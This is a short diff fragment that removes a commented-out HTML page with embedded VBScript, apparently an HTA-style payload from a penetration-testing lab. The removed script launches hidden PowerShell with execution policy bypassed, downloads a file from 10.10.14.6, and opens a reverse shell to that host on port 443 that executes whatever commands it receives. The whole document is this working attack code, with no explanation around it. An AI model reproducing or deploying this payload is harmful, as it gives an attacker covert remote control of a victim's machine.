@@ -1,5 +1,0 @@
-#<html><head><script language="VBScript">
-#Dim cmd
-#cmd = "%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -ep bypass -c ""$null=(iwr http://10.10.14.6/ps_ran_rev);$h='10.10.14.6';$p=443;$c=New-Object Net.Sockets.TCPClient($h,$p);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);try{$o=(iex $d 2>&1|Out-String)}catch{$o=$_.Exception.Message};$o=$o+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($sb,0,$sb.Length)}$c.Close()"""
-#CreateObject("Wscript.Shell").Run cmd,0
-#</script></head><body></body></html>
